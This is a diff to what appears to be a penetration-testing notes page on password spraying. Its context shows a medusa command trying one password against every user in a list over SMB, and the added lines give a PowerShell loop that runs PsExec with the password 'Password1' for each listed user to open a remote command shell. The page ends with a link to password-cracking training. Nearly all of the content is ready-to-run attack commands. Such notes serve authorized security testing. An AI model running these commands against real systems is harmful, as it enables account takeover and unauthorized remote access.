@@ -21,6 +21,12 @@ The below command will perform 1 password attack against each username in the li
 medusa -h 192.168.95.11 -U Common\ users\ list.txt -p Welcome1 -M smbnt -m GROUP:DOMAIN
 ```
 
+### Powershell
+
+```
+ForEach ($file in (Get-Content "list.txt")) {write-host "Attempting user: $file" -ForegroundColor red ;.\PsExec.exe -u $file -p 'Password1' cmd.exe}
+```
+
 ## Password cracking training
 
 {% embed url="https://in.security/technical-training/password-cracking/" %}
